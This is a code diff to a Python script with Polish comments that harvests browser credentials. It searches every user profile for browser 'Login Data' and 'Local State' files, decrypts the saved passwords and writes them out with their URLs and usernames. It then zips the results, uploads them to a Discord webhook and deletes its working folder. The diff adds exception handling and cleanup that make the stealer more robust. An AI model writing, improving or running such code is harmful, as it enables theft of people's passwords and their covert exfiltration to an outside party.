@@ -50,6 +50,7 @@ def decrypt_password(encrypted_password, key):
         decrypted_password = cipher.decrypt(payload).decode('utf-8')
         return decrypted_password
     except Exception as e:
+        print(f"Błąd odszyfrowywania hasła: {e}")
         return f"Błąd odszyfrowywania: {e}"
 
 # Funkcja do wyciągania klucza szyfrującego
@@ -76,8 +77,10 @@ def read_login_data(login_data_path, key):
             decrypted_password = decrypt_password(encrypted_password, key)
             logins.append((url, username, decrypted_password))
         conn.close()
+    except sqlite3.DatabaseError as e:
+        print(f"Błąd bazy danych podczas odczytywania logowań: {e}")
     except Exception as e:
-        print(f"Błąd podczas odczytywania danych logowania: {e}")
+        print(f"Nieoczekiwany błąd podczas odczytywania danych logowania: {e}")
     return logins
 
 # Funkcja do przeszukiwania folderów użytkowników i zbierania plików Login Data
@@ -85,45 +88,54 @@ def search_and_process_login_data():
     zip_file_path = os.path.join(working_dir, "Login_Data_Archive.zip")
     decrypted_data_path = os.path.join(working_dir, "Decrypted_Logins.txt")
 
-    with open(decrypted_data_path, "w", encoding="utf-8") as output_file:
-        for username in os.listdir(users_directory):
-            user_folder = os.path.join(users_directory, username)
+    try:
+        with open(decrypted_data_path, "w", encoding="utf-8") as output_file:
+            for username in os.listdir(users_directory):
+                user_folder = os.path.join(users_directory, username)
 
-            if os.path.isdir(user_folder) and username not in ["Default", "Default User", "All Users", "Public"]:
-                print(f"Przeszukiwanie folderu: {username}")
+                if os.path.isdir(user_folder) and username not in ["Default", "Default User", "All Users", "Public"]:
+                    print(f"Przeszukiwanie folderu: {username}")
 
-                for app_name, relative_path in login_data_paths.items():
-                    app_folder = os.path.join(user_folder, relative_path)
-                    login_data_path = os.path.join(app_folder, "Login Data")
-                    local_state_path = os.path.join(app_folder, "Local State")
+                    for app_name, relative_path in login_data_paths.items():
+                        app_folder = os.path.join(user_folder, relative_path)
+                        login_data_path = os.path.join(app_folder, "Login Data")
+                        local_state_path = os.path.join(app_folder, "Local State")
 
-                    if os.path.exists(login_data_path) and os.path.exists(local_state_path):
-                        print(f"Znaleziono dane logowania w {app_name} dla użytkownika {username}.")
+                        if os.path.exists(login_data_path) and os.path.exists(local_state_path):
+                            print(f"Znaleziono dane logowania w {app_name} dla użytkownika {username}.")
 
-                        # Kopiowanie plików do folderu roboczego
-                        temp_login_data_path = os.path.join(working_dir, f"{username}_{app_name}_Login_Data")
-                        temp_local_state_path = os.path.join(working_dir, f"{username}_{app_name}_Local_State")
-                        shutil.copy2(login_data_path, temp_login_data_path)
-                        shutil.copy2(local_state_path, temp_local_state_path)
+                            # Kopiowanie plików do folderu roboczego
+                            temp_login_data_path = os.path.join(working_dir, f"{username}_{app_name}_Login_Data")
+                            temp_local_state_path = os.path.join(working_dir, f"{username}_{app_name}_Local_State")
+                            shutil.copy2(login_data_path, temp_login_data_path)
+                            shutil.copy2(local_state_path, temp_local_state_path)
 
-                        # Odszyfrowywanie danych logowania
-                        key = extract_key(temp_local_state_path)
-                        if key:
-                            logins = read_login_data(temp_login_data_path, key)
-                            for url, username, password in logins:
-                                output_file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
+                            # Odszyfrowywanie danych logowania
+                            key = extract_key(temp_local_state_path)
+                            if key:
+                                logins = read_login_data(temp_login_data_path, key)
+                                for url, username, password in logins:
+                                    output_file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
 
-    # Tworzenie pliku ZIP
-    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        for root, _, files in os.walk(working_dir):
-            for file in files:
-                zipf.write(os.path.join(root, file), arcname=file)
+        # Tworzenie pliku ZIP
+        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, _, files in os.walk(working_dir):
+                for file in files:
+                    zipf.write(os.path.join(root, file), arcname=file)
 
-    # Wysyłanie pliku ZIP na Discord
-    send_file_to_discord(zip_file_path, webhook_url)
+        # Wysyłanie pliku ZIP na Discord
+        send_file_to_discord(zip_file_path, webhook_url)
 
-    # Czyszczenie folderu roboczego
-    shutil.rmtree(working_dir)
+    except Exception as e:
+        print(f"Nieoczekiwany błąd: {e}")
+
+    finally:
+        # Czyszczenie folderu roboczego
+        if os.path.exists(working_dir):
+            shutil.rmtree(working_dir)
 
 # Uruchomienie skryptu
-search_and_process_login_data()
+try:
+    search_and_process_login_data()
+except Exception as e:
+    print(f"Błąd krytyczny podczas uruchamiania skryptu: {e}")
